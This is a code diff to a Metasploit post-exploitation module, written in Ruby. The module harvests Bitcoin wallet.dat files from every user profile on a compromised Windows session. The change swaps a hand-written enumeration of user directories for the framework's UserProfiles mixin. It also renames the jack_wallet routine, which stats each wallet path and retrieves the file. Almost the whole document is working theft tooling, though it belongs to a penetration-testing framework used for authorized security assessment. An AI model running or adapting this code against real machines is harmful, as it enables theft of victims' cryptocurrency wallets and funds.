@@ -9,15 +9,18 @@
 
 require 'msf/core'
 require 'rex'
-
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather Bitcoin wallet.dat',
-				'Description'   => %q{ This module downloads any Bitcoin wallet.dat files from the target system},
+				'Description'   => %q{ 
+					This module downloads any Bitcoin wallet.dat files from the target system
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'illwill <illwill[at]illmob.org>'],
 				'Version'       => '$Revision$',
@@ -28,28 +31,17 @@ class Metasploit3 < Msf::Post
 
 	def run
 		print_status("Checking All Users For Bitcoin Wallet...")
-		os = session.sys.config.sysinfo['OS']
-		drive = session.fs.file.expand_path("%SystemDrive%")
-
-		if os =~ /Windows 7|Vista|2008/
-			@appdata = '\\AppData\\Roaming\\'
-			@users = drive + '\\Users'
-		else
-			@appdata = '\\Application Data\\'
-			@users = drive + '\\Documents and Settings'
+		grab_user_profiles().each do |user|
+			next if user['AppData'] == nil
+			tmpath= user['AppData'] + "\\Bitcoin\\wallet.dat"
+			jack_wallet(tmpath)
 		end
-
-		get_users
 		
-		@userpaths.each do |path|
-			jack_wallet(path)
-		end
 	end
 
-	def jack_wallet(path)
+	def jack_wallet(filename)
 		data     = ""
-		filename = "#{path}#{@appdata}\\Bitcoin\\wallet.dat"
-		found    = client.fs.file.stat(filename) rescue nil
+		found    = session.fs.file.stat(filename) rescue nil
 		return if not found
 		
 		print_status("Wallet Found At #{filename}")
@@ -72,13 +64,7 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	def get_users
-		@userpaths = []
-		session.fs.dir.foreach(@users) do |path|
-			next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
-			@userpaths << "#{@users}\\#{path}\\"
-		end
-	end
+	
 	
 		
 	def kill_bitcoin
